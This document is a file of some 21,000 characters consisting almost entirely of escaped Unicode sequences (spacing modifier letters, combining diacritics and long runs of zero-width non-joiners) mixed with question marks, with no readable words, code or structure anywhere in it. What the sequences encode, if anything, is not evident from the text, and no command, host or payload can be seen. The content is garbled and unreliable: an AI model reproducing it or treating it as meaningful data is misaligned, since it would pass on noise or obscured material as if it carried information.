8\u030c\u02f4\u0304\u02f4\u02e5\u02f4\u02d2\u0302??\u02e8\u0314\u0303\u02df??\u0317\u02f8\u02f6??\u0314\u0302\u02f6\u02e8\u0308\u02f8\u02f4\u02d7\u0313\u02f7\u02f5??\u030a\u02df\u02ed\u030b??\u0313\u0303\u02ed??\u0310??\u02d7\u0315\u02f7\u02f6\u02e8\u0306\u0300\u02ef??\u0315\u0301\u030b\u02d7\u030f\u02f8\u02f5????\u02f6??\u02d3\u0306\u0300\u02f5\u02f3\u02df\u02d2\u02f7\u02e9\u0318\u02d2\u02f7\u02e9\u0312\u02df??\u02f8\u0306\u0300\u02e6\u02f4\u030a\u02f4\u02e6\u030a\u0315\u02f8\u02ef??\u0306\u0305\u0310??\u0306\u0305\u0310\u02eb\u02df\u02d2\u02f7\u02e9\u030d\u02df\u02ed\u02e5??\u0311??\u02e5??\u030d\u02df??\u0306\u0305\u0310\u200c??\u02f8??\u02f4??\u02f6??\u0302\u030e\u02f8\u02e6\u02f0\u030d\u02df\u02e5\u0302\u030a\u0302??\u02d7\u02e7\u02f8\u02f5\u030a\u030c\u02ff\u02e6\u02ef\u02df\u02f4\u02e5\u0306\u0317\u02f8\u02f5??\u0309\u02df????\u02d3\u0301??\u02f0\u030a\u0300\u02f1\u02d3\u02f3\u02ff\u02e6\u02e8\u030a\u02f7\u02f5\u02f0\u030e\u0300\u030b\u0301\u02df\u02f3??\u0316\u030a\u02f8\u02f6\u200c??\u02d2\u02f7\u02e9\u0308\u02df\u02ed\u02e5??\u0314\u02df??\u0306\u0305\u0310\u02eb\u02df\u02d2\u02f7\u02e9\u030a\u02df??\u030a??\u0300????\u0315\u02f7\u02f6\u02e8\u0306\u02f7\u030b\u0316\u030a\u02f7????\u02df\u02f1\u02f4??\u030a\u0301\u030b\u030a\u0306\u0300\u02e5\u030a\u02d4\u02f7\u02f5\u02e8\u0311\u02f8\u02ef??\u02f2\u0303\u02f6????\u02f8\u02f5??\u0313\u02f3\u030c\u02f4\u0313\u0302\u02e5\u030a\u0312\u02f8\u02f1\u02d3\u02f2\u02f8\u02f6\u02e8\u030e\u02f7\u02f5\u0316\u030e\u0303\u030b????\u02ff\u02f5\u02d7\u0313\u02df??????\u0301\u030b\u030a\u0313\u02f8\u0315??\u02f2\u0302\u02e6\u02e8\u030e\u0300\u030b\u0302??\u0302\u02f5\u030a\u0311\u02f8\u02e5\u02f4\u0317\u02df????\u0315\u0301\u02e5\u02f4\u0313\u02f8\u02df??\u02f3\u0300??????\u0301\u030b\u030a\u0313\u02f8\u0315??\u030c\u02f8\u02f6\u02f0\u0304\u02f2\u02e5\u02f4\u0313\u02f8??\u02f0\u030d\u02df??\u02f8\u0317\u0300??????\u0301\u030b\u0302\u0307\u02df\u02e5\u0302\u030a\u0302??\u02d7\u02f1\u02df\u02e5\u0302\u030a\u0302??\u02d7\u02e6\u02df\u02e5\u0302\u030a\u0302??\u02d7??\u02df??\u030a\u0313\u0301??\u02f4\u0317\u0302??\u02e8\u0306\u0300\u030b\u0302\u030a\u02df\u02ed\u02e5??\u0311??\u02e5??\u030e\u02df??\u02e6\u02f8\u02f6\u02f0??\u0300\u030c\u02f0\u0317\u0303\u02f3??\u0318\u0301??\u02f4\u0312\u02f7\u030b\u0316\u02d3\u02df??\u02d7??\u0301????\u030a\u0300\u02f5\u02e8\u0311\u0303\u02ef??\u02f2\u0303\u02f6????\u02f8\u02f5??\u0313\u02f3\u030c\u02f4\u0313\u0302\u02e5\u030a\u0312\u02f8\u02f1\u02d3\u02e8\u0300\u030c\u02f0\u030a\u0301\u030b\u02d7\u0315\u02f3??\u02f4\u0317\u0302\u030b\u030a\u0308\u02f8\u02f6\u02eb\u02df\u02f2\u02e5\u02d7\u0306\u02f8\u02df??\u0306\u0305\u0310??\u0306\u0305\u030f\u02eb\u02df\u02d2\u02f7\u02e9??\u02df\u02ed\u02e5??\u0310\u0303\u02e5??\u030e\u02ef????\u02ff\u02f6\u02f0??\u0300??\u02d3??\u02f8\u02f6\u02e8??\u02f8\u02f6\u02e7\u02df\u02f4\u02e5\u02d7\u02e8\u0300\u030c\u02ef\u0318\u02eb\u0305??\u02e6\u02f8\u02f6\u02f0??\u0303\u02f6\u02f0\u030a\u0301\u0315??\u0306\u0305\u030f??\u0306\u0305\u030f??\u02df\u02f8??\u02f4??\u02f6????\u02f2\u02ef??\u030a\u02e8\u02df\u02e5\u02d7\u0315\u02f6??\u030a\u0313\u02f8\u02f6????\u02f7\u02f5\u0316\u030e\u0302\u02e6\u0309\u02df\u02f3\u030b\u02f4\u0306\u02f8\u02df??\u02e6\u02f8\u02f6\u02f0\u02ef\u02ff\u02f6\u0306\u030a\u0300\u02df??\u030c\u02f8\u02f6\u02f0\u0304\u02ef??\u02d7??\u0300\u030c\u02ef\u02df\u02ef??\u02d7\u0313\u02f7??????\u02df????\u0306\u02eb\u200c??\u0306\u02e7\u02f2??\u02df\u02ef??\u02d7\u0312\u0301\u02e5\u030a\u0311\u02f7\u02f6\u02f0\u030e\u0300??\u02d3\u02f1\u02f8\u02f5\u0316\u0306\u0303\u02e5????\u02ff\u02f5\u02d7\u0313\u0301??????\u0302\u02e6\u02e8\u030e\u02f7\u030c\u02f4??\u02f8\u02ef??\u02f1\u0302\u02f5\u02d3??\u02ff\u02f5??\u030a\u02ef??\u02d7\u0312\u0301\u02e5????\u02ff\u02f5\u02e8\u030e\u0300\u02e5\u030a??\u0303\u02f3????\u0302\u02e6\u02e8\u030e\u02f7\u030c\u02f4??\u02f8\u02ef????\u0301????\u030a\u0300\u02f5\u02e8\u0311\u0303\u02f4\u02f0\u030e\u0302\u02e5\u0316\u030a\u02ef\u02f6\u02f0??\u0301\u030b\u030a\u0307\u0302\u02f6\u02f0\u030a\u02df????\u0318\u0301??\u02f4\u0312\u02f7\u030b\u0316\u02d3\u02f0\u02e5\u02f4\u0318\u02f7??\u02e8\u030e\u0301\u02e6\u02f0\u030e\u0300??\u02d3??\u0302\u02e6\u02f0\u0317\u02ff\u02f5\u02e8??\u0302\u02e5\u02f3\u02df\u02ef\u02f6??\u0318\u02f8\u02f5??\u0307\u0300\u02e6\u030a??\u0300??\u02d3\u030b\u02ff\u02f5\u0302??\u0301\u030b????\u02ff\u02f5\u02d7\u0313\u02ef\u02f6\u02f0??\u0301\u030b\u030a\u0307\u0302\u02f6\u02f0\u030a\u02df????\u0318\u0301??\u02f4\u0312\u02f7\u030b\u0316\u02d3\u02ef??\u02d7\u0312\u0301\u02e5??\u0313\u0303\u02f3????\u0302\u02e6\u02e8\u030e\u02f7\u030c\u02f4??\u02f8\u02ef????\u0301????\u030a\u0300\u02f5\u02e8\u0311\u0303\u02f4??\u0317\u0300??\u02f0??\u02f7??\u02f0??\u0302\u02e6\u02f0\u0317\u02ff\u02f5\u02e8??\u0302\u02e5\u02f3\u02df\u02ef\u02f6??\u0318\u02f8\u02f5??\u0307\u0300\u02e6\u030a??\u0300????\u02d3\u0301\u030b\u030a\u030c\u02ff\u02e6\u02f0??\u0302\u02e6\u02f0\u0317\u02ff\u02f5\u02e8??\u0302\u02e5\u02f3\u02df\u02ef\u02f6??\u0318\u02f8\u02f5??\u0307\u0300\u02e6\u030a\u02f3\u0301\u030b??\u0309\u02f8\u02f5??\u0306\u0301\u030b\u0312??\u0302\u02e6\u02f0\u0317\u02ff\u02f5\u02e8??\u0302\u02e5\u02f3\u02df\u02ef??\u02d7\u0312\u02f4\u030b\u030a\u0318\u02ff\u02f5\u02e8\u0311\u02f8\u02f3????\u0302\u02e6\u02e8\u030e\u02f7\u030c\u02f4??\u02f8\u02ef??\u02e6\u0302\u02f5\u030a\u0309\u02ef\u02f6\u02f0??\u0301\u030b\u030a\u0307\u0302\u02f6\u02f0\u030a\u02df????\u0318\u0301??\u02f4\u0312\u02f7\u030b\u0316\u02d3\u02f0\u030b\u030a\u0311\u02f8\u02f4\u02f8\u030a\u0301\u030c??\u030e\u0300??\u02d3??\u0302\u02e6\u02f0\u0317\u02ff\u02f5\u02e8??\u0302\u02e5\u02f3\u02df\u02f3??\u02f4\u0315\u0301\u02e6\u02e8\u030a\u0301????\u02e8\u0300\u02e5\u02f0\u0306\u0301??????\u0302\u02e6\u02f0\u0317\u02ff\u02f5\u02e8??\u0302\u02e5\u02f3\u02df??\u030d\u02df\u0303\u0307\u0316\u030f\u0318\u0300??\u0303\u0318\u0311??\u02d2\u0313\u02e7??\u0316\u030f\u0303\u200c??\u02e7\u0312??\u030e\u0301\u02f4\u0306\u0309??\u02d2\u02e7\u0309\u02e7\u0311??\u02d7\u0304\u0304\u0316\u02e6\u02f4??\u0308\u030d\u02e6\u200c??\u02e7????\u0305??\u02f0??\u02ef\u02eb\u200c??\u02df??????\u0306??\u02eb\u02df\u0315\u02f7\u0302\u02df\u0316\u030d\u02e6????\u02e7\u02f8??\u0305??\u02e7\u02e6??\u0315\u0301??\u02df\u0305\u02e7??\u02df\u0305\u02e7??\u02df\u0305\u0302\u02df\u0315\u0305\u02e7\u02e6\u02ef\u02eb\u02e7??\u02df\u02f3\u0305\u02df\u02ef??\u0302??\u02ef\u02e7\u0302??\u02ef\u02ef\u02e9\u02df\u02f0\u02e7\u02f8??\u0317\u02df??\u02df\u02f0\u02e7\u02f8??\u02f1\u0309??\u02e7\u200c??????\u0305\u02df??\u02e6\u02ef\u02f3\u0302??\u02f0??\u02e6????\u0315\u02e7\u02e6\u02ef\u02f3\u02e7??\u02df\u02e7??\u02e6\u02df\u0305\u02e7\u02e6\u02ef\u02eb\u0302\u02df\u0315\u02f3\u02e9\u02df\u0305\u02d2\u02f1\u02eb\u02ef\u02eb\u02e9\u02df\u02ef\u02d2\u02e8??\u02df????\u02df\u02f0\u02df\u0302\u02e6\u0305\u02df\u02e7\u02df\u0315\u030d????\u02ef\u0301\u200c??\u0306????\u02e6\u02ef\u02f3\u02ed??\u02ef\u0301\u02ed??\u0308\u02f3\u02e7??\u02df\u0305\u02e7??\u02f2\u0309??\u02df\u0305\u02e7\u02f1??\u02ef\u0305\u02e7\u02e6\u02ef\u02eb\u0302\u02df\u0315\u02ef\u02e9\u02df\u02f0\u02e8????\u02df\u030d????\u0309\u02f3????\u0305??\u02f1??\u02ef\u02f7\u02e9\u02df\u0306\u02e7\u02d7??\u0309\u0309\u02e5\u200c????\u02f1\u02f2\u02f0??\u02f0??\u0307\u02df????\u0305??\u02f1\u02f2\u02ef\u02f7\u200c??\u02f0??????\u0309\u02f3\u02e8??\u0315\u02f3\u0301??\u0309??\u02e7??????????\u02df\u030d????\u0305\u02d2\u02e5\u02e7\u02df\u02e7????\u0306\u02e8\u02f8????\u02df??\u02e6\u02df\u02d2\u02e5\u200c??\u02e7\u02f1\u02f0\u02ef\u02d2\u02ed??\u0315\u0301\u02ea??\u0309??\u0301??\u0305??\u02f1??\u02f0\u02e8\u0302\u02e6??\u0315\u02e7????????\u02e6\u02ef\u02eb????\u0305\u02e7\u02ed\u02e6\u02df\u0309\u02df????\u0315\u0301??\u0306??\u030e\u02e6\u02f0\u0315??\u200c????????\u02df\u02f7\u200c??\u0315??\u02ed??\u0305\u02d2????\u0306??\u02f3??\u0315\u0301\u02e6??\u02df\u0305\u02e7??\u02df\u0305\u0302\u02df\u0316????\u02df\u0306\u02d2\u200c??\u0317\u200c????\u02df\u0305\u02ef\u02df\u02ef\u02eb\u02e7\u02e6\u0305\u02df??\u02df\u0315\u0311\u02e6??\u02df\u0305\u02e7??\u02df\u0305\u02e7\u02e6\u02ef\u02eb\u02e7??\u02df\u02f7\u200c??\u0315??\u02e7??\u02df\u02eb????\u0306\u02e7??\u02df\u0315\u02f7\u02f0\u02e7??\u030d\u02e6??\u02ef\u0305\u02e7\u02e6??\u02f3\u02f1\u0303\u02ef??\u02ed??\u030c??????\u02df\u0305\u02e7????\u0315\u0301??\u02df\u0305\u02e7\u02e6\u02ef\u02eb\u0302\u02df\u0315\u02e7\u0302\u02df\u0315\u02e7\u0302??\u0305\u02f7\u0305\u02df\u02f0\u02e9\u02df\u0306\u02ef\u02eb??\u02e7\u200c??\u02ed??\u200c??????\u0306\u02e8????\u02df\u02f3\u02e7??\u0305\u0301\u02e6??\u02df\u0305\u02e7??\u02df\u0305\u02e7\u02e6\u02ef\u02eb\u02e7??\u02df????????\u02d2\u02df??\u02df\u0305\u02ed??\u0315\u0305\u02e7??\u02f2\u0309\u02f0\u02ed\u02ef\u0305\u02e7????????\u02e6\u02ef\u02eb\u02e7\u200c??\u02ef\u02f0\u02ed\u02ef\u0305\u02e7??\u02df\u0305\u02e9\u200c??\u02f7\u02f0\u02ed\u02ef\u0305\u02e7??\u02df\u0305\u02e5\u02df\u0315\u0311\u02e6??\u0315\u0305????\u02df\u0305\u02e7\u02e6\u02ef\u02eb\u0302\u02df\u0315\u02eb\u0305\u200c??\u02f3\u02e7\u200c??\u02eb????????\u02d3\u02df\u0315\u02eb\u02eb??\u0315\u0305\u02e7??\u02df\u0305\u02e7\u02e6\u02ef\u02eb\u0302\u02df\u0315\u0305\u02e7\u02df\u0306\u02d2????\u0307\u02df??\u02df\u02ef\u0305\u02f1\u02f1\u02ef\u0311\u02ef\u02df\u0305\u02f3??\u02e6\u0305\u02df\u02e7\u02e6\u0305??\u02e7??\u02df\u0305\u02e6??\u02ef\u0305\u0301??\u02df\u0305\u0302\u02df\u0315\u02ef\u200c????\u02e8\u02f8??\u0305\u02df????\u030a\u0309????\u02df??\u02e6??\u0315\u0305\u02f1\u0305\u02e7\u0309\u02e7??\u02df\u0305\u0302\u02df\u0316??????\u0305\u02df????\u030a\u0309\u0302??\u02ef\u0305\u200c??\u0316\u02e8\u02f8\u02e6\u02ef\u02f3??\u02df\u0315\u0309\u02e6??\u02f0\u0315\u02e7????????\u02e6\u02ef\u02eb\u02eb??\u0315\u0305\u02e7??\u02df\u0305\u02e7??\u02df\u0305\u0302\u02df\u0316??????\u0305\u02df????????????\u02df\u0305\u02df??\u02df\u0305\u0302??\u02ef\u0305\u02e5\u02df\u0315\u030d\u02e6??\u0315\u0305\u0301??\u02df\u0305\u02e7??????????\u02f1\u02df??\u02e6\u02ef\u02f3\u02ed??\u0316\u02df??????????\u02e6\u0305??\u0303\u200c??\u02eb\u02e5??\u0305\u0301\u02e5????\u0315\u02e7????????\u02e6\u02ef\u02eb??\u200c??\u02df\u02f1\u02eb\u02ef\u02f7\u200c??\u0306\u02e7\u0316\u02df\u0315\u0305\u02e9??\u0315\u0301\u02e7\u02df\u0305\u0305\u02e7??\u02df\u0305\u0302\u02df\u0315\u0301\u200c??\u0305\u02e7\u02f0\u02ed\u02f0??\u02d3??\u02ef\u02df??\u02df\u0306??\u02d3??\u02f2\u0309\u02e5??\u0305\u02d2\u02ef\u02df\u0305\u02f7\u0301\u02e6\u0305??\u0303\u02df????\u030e\u02e6\u02f0\u0315\u02e7\u02df\u0315\u0301\u0305\u02df\u0315\u0305\u0302??\u02ef\u0305\u02e7????\u02df????\u0305\u0305\u0303\u02df????????\u02df\u0305\u02e7??\u0305\u02f7\u0305\u02df\u0306??\u02d3??\u02df\u0305\u02ea??\u02df??????\u02f2\u0309\u0303\u200c??\u0305\u02e7\u02df\u0315\u0305\u02e7??\u02df????????\u02d2\u02df??\u0305\u02f7\u02eb??\u0315\u0305\u02e7\u02e6\u02df\u0305\u02e7??\u02df\u0305\u0302\u02df\u0316??????\u02ef\u02df????\u0305\u02d2\u02ed??\u0306\u02df????\u02df\u02d2\u0303\u02df\u02f0\u02d2\u200c??\u0315\u02eb??\u02e7\u02df??????\u02df\u0305??\u200c??\u0305\u200c??\u200c??\u200c????\u02d2??\u200c????\u02df\u02f4\u02df\u02e7\u02f5\u02f4??\u02e8\u0306\u0301??\u02d3\u0314\u0300\u0309\u02f4\u02d2\u02f7??\u02f4\u0315\u0302\u02e5\u030a\u0314\u0300\u030a\u02f0\u030d\u0301\u030b\u02d7??\u0301\u0315????\u02e7\u02df??????\u0306\u02d2??\u02df??\u030a??\u0302\u02f5\u02d3\u030e\u02f8\u030c\u02f3\u0305\u02f0\u030c\u02e8\u0306\u0300\u02f5\u02f4??\u0300??\u02e8\u0310\u02e7????\u0305\u02f4\u02f3\u0309\u0305\u02f2\u02e5\u030a\u0307\u200c??\u02df\u0305\u02df\u02ef\u02df\u0300\u02ef??\u02f4\u0318\u0302\u02e5\u02d7\u0312\u02e7??\u02e8??\u0300\u030b\u030a\u030b\u0302\u02f1\u02df\u0313\u02f2\u0309\u02f4\u02f3\u02e7\u02e5??\u0314\u0300\u030c\u02f0\u0317\u0300??\u0316\u0318\u200c??\u02df??\u02df\u02ef\u200c??\u200c??\u02df\u02f7\u02df\u02ef\u02df\u02f2\u02ef\u030c\u02f4\u0313\u02ff\u02f5\u02f8??\u02e7??\u02f0\u030a\u02f7??\u0306\u0313\u0300??\u0316\u0314\u02f8??\u030a\u030a\u0301\u0315\u200c????\u0305??\u02df??\u02f3\u02e8??\u0300\u030b\u030a\u030b\u0302\u02f1??\u02f4\u02f1\u02ef\u200c????\u0315??\u02df??\u0309??\u0314\u0301\u02e6\u030a\u0317\u02ff\u02f5\u0302\u030d\u0302??????\u030f\u02f1\u02df\u0305\u02eb\u0308\u02df\u0316??\u0305\u200c??????\u02df??\u02df\u02ef\u02e7\u030e\u02df\u02ef\u02df\u0309\u02ed\u02f5\u02f8\u0307\u02ed??\u02e7\u0315??\u030b\u02f3\u0312????\u02df\u0315\u02f8\u0307????\u02eb\u0318\u02f7\u0315\u02ea\u02f2\u0309????\u0318\u0309\u0312\u02eb??\u0309??\u02eb\u02f2??\u0306????\u02e8\u030b\u02f7\u02f2\u02f7??\u200c??\u02df\u02eb\u02df\u02ef\u02df\u02e6\u02eb\u02f1\u02d2\u0318\u02ea\u0308\u02df\u0313\u02eb\u200c??\u02df??\u02df??\u200c??\u02df??\u0309\u02f4\u0315\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??????\u02f4\u0315\u200c??\u02df??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u02d6??\u0301\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u02df??\u0304\u02ef??\u02d7\u0317\u02f0\u02e5\u0316\u0311\u02f2\u02f5??\u030e\u0300\u0305??\u0312\u0301????\u0314\u0301\u030b\u02f4\u030a\u02ea\u030b\u02f0\u0311\u0300\u200c??\u200c??\u200c??\u02df??\u0317\u02f3\u02df\u02e7??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u02df??\u02df??\u200c??\u200c??\u02df\u02f7\u200c????\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c????\u200c????\u200c??\u200c??\u0315\u200c????\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c????\u200c??\u200c??\u200c????\u02e7\u200c??\u200c??\u02f5\u02e5\u200c??\u02df\u02e8\u02ef??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u02df\u02e8\u02ef????\u200c??\u200c????\u02f7\u02df\u02f3\u0315??\u0304\u02df??\u02f7\u02df\u02f0\u02ef??\u02f1\u02df??\u02eb\u02df\u02f1\u02ef????\u02df??\u02d2\u02df\u02f6\u0315??\u02e8\u02df??\u02d2\u02df\u02f0\u0305????\u200c??\u200c??\u200c????\u02d7??\u02ed????\u200c??\u02df??\u200c??\u02eb\u200c??\u02ef\u200c??\u200c??\u200c??\u02df\u0315\u02df??\u200c??\u200c??\u200c??\u02df??\u200c??\u200c??\u200c??\u200c??\u200c??\u02ef\u200c??\u200c????\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u200c??\u02f0\u200c??\u200c??\u02df??\u02df\u02f4\u0305??\u0306\u02df\u02e6\u02e7\u02df\u02f0\u0305??\u030e\u02df\u02e5\u0315\u02df\u02f8\u02ef??\u02e8\u02df\u02e5\u02d2\u02df\u02f8\u0305??\u0314\u200c??\u200c??\u200c??\u02df\u0309\u200c??\u02ef\u200c??\u02df??\u02f3\u02df\u02e6\u02e7\u02df\u02f7\u02ef??\u0313\u02df\u02e6\u02eb\u02df\u0300\u02df??\u0306\u02df\u02e6\u02ef\u02df\u02ff\u02ef??\u0314\u02df\u02e5\u02d2\u200c??\u200c??\u200c??\u200c??\u02df\u0311\u02df\u02f2??\u02df\u0305\u200c??\u02df\u02ef??\u02f2\u02df\u02e6\u02ef\u02df\u0301\u0305??\u030e\u02df\u02e5\u02d2\u02df\u02f8\u0315??\u02e5\u02df\u02e5\u0309\u02df\u0300\u02df??\u030a\u02df??\u0309\u02df\u0300\u0305??\u030b\u02df\u02e5\u02d6\u200c??\u02df??\u02ef\u02df\u0305\u200c??\u02df\u02ef\u02df\u0315\u02df??\u200c??\u02eb\u200c??\u0315\u02df??\u200c????\u02df??\u0307\u02df??\u200c??\u200c????\u02ef\u02df??\u0315\u200c??\u02ef????\u02df\u02e5\u02d6\u02df\u0300\u02ef??\u0312\u02df\u02e5\u02f3\u02df\u0300\u0305????\u02df\u02e6\u02eb\u200c??\u02df????\u02df\u02e6\u02f3\u02df\u0301\u0315????\u02df\u02e5\u02d6\u02df\u0300\u02ef\u02df\u0305\u02df??\u02e7\u02df\u0302\u02ef??\u0313\u02df\u02e5\u0309\u02df\u02f8\u0305????\u02df??\u200c??\u02ea\u0305??\u02ed\u02df??\u02f3\u02df\u02f4\u200c??\u0305\u02df\u02e5\u02eb\u02df\u0300\u0315??\u0313\u02df\u02e6\u02ef\u02df\u0301\u0305??\u0314\u02df\u02e5\u0315\u02df\u0301\u0315\u200c??\u02df??\u0305\u02df??\u200c????\u02df??\u02eb\u02df\u0300\u0315??\u0312\u02df\u02e6\u200c??\u02f7\u02ef??\u0313\u02df\u02e6\u0309\u02df\u02f2\u0305??\u0306\u02df\u02e5??\u02df\u02f8\u02ef\u200c??\u200c??\u200c??\u02ef\u0305????\u02df\u02e5\u02d2\u02df\u02ff\u02ef??\u030b\u02df\u02e6\u02f3\u02df\u02e7\u02df??\u02f3\u02df\u02e5\u02f3\u02df\u02f7\u0315??\u030d\u02df\u02e5\u02d2\u02df\u0300\u0315??\u0311\u02df\u02e5\u02d6\u02df\u02f8\u0315??\u030e\u02df\u02e5\u02f3\u02df\u0301\u0315\u200c??\u02df??\u0315\u02df\u02e5\u0305\u02df??\u02df??\u02f7\u02df\u02ff\u02ef??\u0311\u02df\u02e5\u02f3\u02df\u02f0\u02df??\u030a\u02df\u02e6\u02eb\u02df\u02f7\u0315??\u0317\u02df\u02e5\u0309\u02df\u0301\u02df????\u02df\u02e5\u0309\u02df\u0300\u0315??\u0313\u200c??\u200c??\u200c??????\u02df\u02e6\u02f3\u02df\u0300\u0305??\u030e\u02df\u02e5\u02f7\u02df\u0302\u02ef\u02df\u0305\u02df??\u02f7\u02df\u0301\u0305??\u0306\u02df\u02e5??\u02df\u02f8\u02ef????\u02df\u02e5\u02d6\u02df\u0301\u0305??\u0310\u02df??\u200c??\u02ea\u02ef\u02df\u0305\u02df??\u02f3\u02df\u02f1\u02ef\u02df\u0305\u02df??\u0315\u02df\u02ff\u02ef??\u0307\u200c??\u200c??\u02eb\u200c??\u02e7\u200c????\u02df\u02f0\u0305??\u030e\u02df\u02e5\u0315\u02df\u02f8\u02ef??\u02f5\u02df\u02e5\u02f3\u02df\u0301\u0305??\u0318\u02df\u02e5\u0309\u02df\u0300\u0315??\u0313\u200c??\u200c??\u200c??\u02df\u0316\u02df??\u02d2\u02df\u02eb\u0315\u02df\u0313\u02df??\u200c??\u02ea\u0305\u02df\u0315\u200c??\u200c????\u200c??\u02ed\u200c????\u02df\u02f1\u02ef??\u0313\u02df\u02e6\u02ef\u02df\u02f8\u02ef??\u0317\u02df\u02e5\u02d2\u02df\u02f7\u02ef??\u0311\u02df??\u02d2\u02df\u02f7\u02ef??\u0312\u02df\u02e5\u02f3\u200c??\u02df????\u02df\u02e6\u02f3\u02df\u0300\u0305??\u030e\u02df\u02e5\u02f7\u02df\u0302\u02ef\u02df\u0313\u02df??\u02f3\u02df\u02f1\u02ef\u02df\u0313\u02df\u02e5\u02ef\u02df\u0300\u02df??\u0311\u200c??\u200c??\u02f1\u200c??\u02f1\u200c????\u02df\u02f2\u02df??\u030a\u02df\u02e5\u0301\u02df\u02f7\u02ef??\u0311\u02df??\u02eb\u02df\u0300\u0315??\u0315\u02df\u02e6\u0309\u02df\u0301\u0305??\u030e\u02df\u02e5\u0301\u02df\u02ff\u02df????\u200c??\u200c??\u02ef\u0315??\u0314\u02df\u02e6\u200c??\u0303\u02ef??\u0317\u02df\u02e5\u0309\u02df\u02f8\u0315??\u030d\u02df\u02e6\u02ef\u02df\u02e7\u02df??\u030e\u02df??\u200c??\u02e7\u200c??\u0317\u02df??\u200c??\u02eb\u02ef\u02df??\u200c??\u200c??\u02e9\u0305\u02df??\u200c????\u02df\u02f2\u02df??\u030a\u02df\u02e5\u0301\u02df\u02f7\u02ef??\u0311\u02df??\u02ef\u02df\u0301\u0305??\u0306\u02df\u02e5\u02ef\u02df\u02f8\u02ef??\u0312\u02df\u02e5??\u02df\u0301\u0305??\u0310\u02df\u02e6\u02eb\u200c??\u200c??\u200c??\u200c??\u200c??\u02df????\u200c??\u02d2\u200c??\u02ef????\u02df\u02e6\u02e7\u02df\u02ff\u02ef??\u030c\u02df\u02e5\u0309\u02df\u0300\u0305??\u0306\u02df\u02e5\u0315\u02df\u02f0\u0305??\u030e\u02df\u02e5\u0315\u02df\u02f8\u02ef??\u0313\u02df\u02e5??\u02df\u0300\u02ef??\u030a\u200c??\u200c??\u02ef\u0305????\u02df\u02e5\u02d2\u02df\u02ff\u02ef??\u030b\u02df\u02e6\u02f3\u02df\u02ea\u0305??\u02f4\u02df??\u0309\u02df\u02ea\u0305??\u0309\u02df\u02e5\u0315\u02df\u0300\u200c??\u200c????\u02ef\u02df??\u0305\u02df??\u02df??\u200c??\u0301\u0305??\u0314\u02df\u02e5\u02ef\u02df\u0302\u02ef??\u0308\u02df\u02e6\u02ef\u02df\u02f2\u0305??\u0306\u02df\u02e5??\u02df\u02f8\u02ef\u200c??\u200c??\u200c??\u02ef\u0305????\u02df\u02e5\u02d2\u02df\u02ff\u02ef??\u030b\u02df\u02e6\u02f3\u02df\u02e7\u02df??\u02f4\u02df??\u0309\u200c??\u200c????\u200c??\u0305\u200c??\u02ef??\u02ef\u02df\u02e6